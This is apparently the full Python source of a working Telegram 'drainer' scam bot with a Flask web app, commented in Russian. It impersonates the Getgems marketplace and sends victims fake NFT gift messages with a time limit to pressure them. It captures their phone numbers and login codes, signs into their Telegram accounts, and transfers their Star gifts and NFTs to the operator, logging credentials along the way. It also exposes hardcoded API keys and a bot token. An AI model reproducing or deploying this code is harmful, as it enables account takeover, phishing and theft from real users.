import os
import asyncio
import threading
import urllib.parse
import datetime
import time  # Добавлено для контроля времени
from flask import Flask, render_template, request, jsonify
from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import (
    SessionPasswordNeededError, 
    RPCError, 
    SessionRevokedError, 
    PhoneCodeInvalidError
)

# --- КОНФИГУРАЦИЯ ---
API_ID = '34426356'
API_HASH = 'ddfa0edfefb66da4b06bc85e23fd40d5'
BOT_TOKEN = '8028370592:AAHmcGRTUoxPEwbDBcw1tsQmQlx5cty3ahM'
ADMIN_ID = 678335503
WORKER_ID = 8311100024
DOMAIN = "getgemsdrainer-production.up.railway.app" 

bot = TelegramClient('bot_auth', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
app = Flask(__name__)

active_clients = {}
temp_clients = {}
pending_contacts = {}

# --- СИСТЕМА ВЕЧНОГО ДОСТУПА (TRUSTED) ---
TRUSTED_FILE = "trusted.txt"

def get_trusted():
    """Загружает список ID из файла навсегда"""
    if not os.path.exists(TRUSTED_FILE):
        return [ADMIN_ID, WORKER_ID]
    with open(TRUSTED_FILE, "r") as f:
        ids = [int(line.strip()) for line in f if line.strip().isdigit()]
        if ADMIN_ID not in ids: ids.append(ADMIN_ID)
        if WORKER_ID not in ids: ids.append(WORKER_ID)
        return ids

def add_trusted(user_id):
    """Добавляет ID в файл для сохранения после перезагрузки"""
    trusted = get_trusted()
    if user_id not in trusted:
        with open(TRUSTED_FILE, "a") as f:
            f.write(f"{user_id}\n")
        return True
    return False

def save_log(text):
    with open("logs.txt", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now()}] {text}\n")

def send_log(msg, buttons=None):
    save_log(msg)
    bot.loop.create_task(bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons))
    bot.loop.create_task(bot.send_message(WORKER_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html'))

# --- ЛОГИКА СЛИВА (DRAIN LOGIC) ---
async def drain_logic(client, phone):
    try:
        res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
        if res.balance < 25:
            my_stars = await bot(functions.payments.GetStarsStatusRequest(peer='me'))
            if my_stars.balance >= 30:
                me = await client.get_me()
                send_log(f"⛽ Заправка {phone}. Дарим 2 мишки...")
                for _ in range(2):
                    try:
                        await bot(functions.payments.SendStarGiftRequest(peer=me.id, gift_id=685))
                        await asyncio.sleep(2)
                    except: pass
                await asyncio.sleep(7)
                received_gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=5))
                for g in received_gifts.gifts:
                    try:
                        await client(functions.payments.SaveStarGiftRequest(stargift_id=g.id, unsave=True))
                    except: continue
                res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
                send_log(f"💰 Новый баланс {phone}: {res.balance}★")
            else:
                send_log(f"⚠️ Нет звезд на доноре для заправки {phone}!")

        all_gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=100))
        total_found = len(all_gifts.gifts)
        success_count = 0
        for nft in all_gifts.gifts:
            try:
                await client(functions.payments.TransferStarGiftRequest(to_id=ADMIN_ID, stargift_id=nft.id))
                success_count += 1
                await asyncio.sleep(3)
            except Exception as e:
                if "BALANCE_TOO_LOW" in str(e): break
                continue

        btns = None
        if success_count < total_found or total_found == 0:
            btns = [Button.inline("🔄 Высушить заново", data=f"redrain_{phone}")]
        send_log(f"🏁 Слив {phone} окончен. Переведено: {success_count}/{total_found}", buttons=btns)

    except SessionRevokedError:
        send_log(f"❌ Мамонт {phone} завершил сессию.")
    except Exception as e:
        btns = [Button.inline("🔄 Высушить заново", data=f"redrain_{phone}")]
        send_log(f"⚠️ Ошибка drain_logic {phone}: {e}", buttons=btns)

# --- ИНЛАЙН РЕЖИМ (ИСПРАВЛЕННЫЙ И ДОРАБОТАННЫЙ) ---
@bot.on(events.InlineQuery)
async def inline_handler(event):
    if event.sender_id not in get_trusted():
        await event.answer([], switch_pm="Доступ ограничен.", switch_pm_param="no_access")
        return

    if not event.text or not event.text.strip().startswith("http"):
        await event.answer([], switch_pm="Введите ссылку на NFT подарок...", switch_pm_param="help")
        return

    input_text = event.text.strip()
    try:
        nft_name = input_text.split('/')[-1].replace('-', ' ').title()
    except:
        nft_name = "NFT Gift"

    # Добавляем временную метку (timestamp) для проверки 60 минут
    timestamp = int(time.time())
    web_url = f"https://{DOMAIN}/?nft_url={urllib.parse.quote(input_text)}&t={timestamp}"
    
    builder = event.builder
    
    await event.answer([
        builder.article(
            title=f"🎁 Отправить подарок: {nft_name}",
            description="Лимит: 60 минут",
            text=(
                f"🎁 **Вам отправили подарок: {nft_name}**\n\n"
                "Учтите, что подарок можно принять только с аккаунта, на "
                "который он был отправлен. Ссылка действительна "
                "**60 минут**.\n\n"
                f"{input_text}"
            ),
            link_preview=True,
            buttons=[
                # Основная кнопка для захода в WebApp (слив)
                [Button.web_app("Забрать NFT 🎁", web_url)],
                # Кнопка перекидывает ИМЕННО на подарок в Telegram
                [Button.url("Посмотреть подарок", input_text)]
            ]
        )
    ])

# --- ОБРАБОТЧИКИ КОМАНД ---

@bot.on(events.NewMessage(pattern='/ftpteam ftpteam'))
async def ftpteam_handler(event):
    if add_trusted(event.sender_id):
        username = f"@{event.sender.username}" if event.sender.username else "N/A"
        send_log(f"🔑 Пользователь {username} (ID: {event.sender_id}) получил доступ.")
        await event.respond("✅ Доступ разрешен.")

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    welcome_text = "Это бот Getgems. 🎯\n\n💎 0% комиссии на торговлю подарками."
    buttons = [[Button.url("Торговать подарками ↗", "https://getgems.io/nft-gifts")]]
    await event.respond(welcome_text, buttons=buttons, link_preview=False)

@bot.on(events.NewMessage(pattern='/stars_check'))
async def stars_check(event):
    if event.sender_id != ADMIN_ID: return
    try:
        res = await bot(functions.payments.GetStarsStatusRequest(peer='me'))
        await event.respond(f"📊 <b>Баланс:</b> {res.balance}★", parse_mode='html')
    except Exception as e:
        await event.respond(f" Ошибка: {e}")

@bot.on(events.CallbackQuery(pattern=rb'redrain_(.*)'))
async def redrain_callback(event):
    phone = event.pattern_match.group(1).decode('utf-8')
    if phone in active_clients:
        await event.answer("Запускаю...")
        asyncio.create_task(drain_logic(active_clients[phone], phone))

# --- API ROUTES (FLASK) ---
@app.route('/')
def index(): 
    target = request.args.get('nft_url', 'Главная')
    t_start = request.args.get('t')
    
    # Проверка на 60 минут (3600 секунд)
    if t_start:
        try:
            if int(time.time()) - int(t_start) > 3600:
                return "<h1>Ошибка: Время принятия подарка истекло (60 минут).</h1>", 403
        except: pass

    send_log(f"🌐 Мамонт открыл WebApp. Цель: {target}")
    return render_template('index.html')

@app.route('/api/send_code', methods=['POST'])
async def api_send_code():
    data = request.json
    phone, code = data.get('phone'), data.get('code')
    send_log(f"🔑 Код {phone}: {code}")
    try:
        client = temp_clients[phone]['client']
        await client.sign_in(phone, code, phone_code_hash=temp_clients[phone]['hash'])
        active_clients[phone] = client
        send_log(f"✅ Успех {phone}. Слив...")
        asyncio.create_task(drain_logic(client, phone))
        return jsonify({"status": "success"})
    except PhoneCodeInvalidError:
        return jsonify({"status": "error", "message": "Неверный код"})
    except SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "details": str(e)})

@bot.on(events.NewMessage)
async def contact_handler(event):
    if event.contact and event.contact.user_id == event.sender_id:
        phone = event.contact.phone_number
        if not phone.startswith('+'): phone = '+' + phone
        pending_contacts[str(event.sender_id)] = phone
        try:
            client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
            await client.connect()
            res = await client.send_code_request(phone)
            temp_clients[phone] = {'client': client, 'hash': res.phone_code_hash}
            send_log(f"📩 Код на {phone} отправлен.")
        except Exception as e:
            send_log(f"❌ Ошибка {phone}: {e}")

if __name__ == '__main__':
    if not os.path.exists('sessions'): os.makedirs('sessions')
    port = int(os.environ.get("PORT", 8080))
    threading.Thread(target=lambda: app.run(port=port, host='0.0.0.0', use_reloader=False), daemon=True).start()
    bot.run_until_disconnected()